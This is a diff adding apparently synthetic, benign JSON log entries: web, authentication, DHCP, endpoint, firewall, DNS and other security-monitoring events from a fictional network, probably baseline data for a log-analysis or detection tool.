+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:19:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.42", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:19:20+00:00", "log_type": "dns", "src_ip": "10.0.1.25", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:19:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:19:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.45", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:19:30+00:00", "log_type": "dns", "src_ip": "10.0.1.22", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:19:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:19:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.18", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:19:40+00:00", "log_type": "dns", "src_ip": "10.0.1.36", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:19:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:19:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.35", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:19:50+00:00", "log_type": "dns", "src_ip": "10.0.1.38", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:19:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
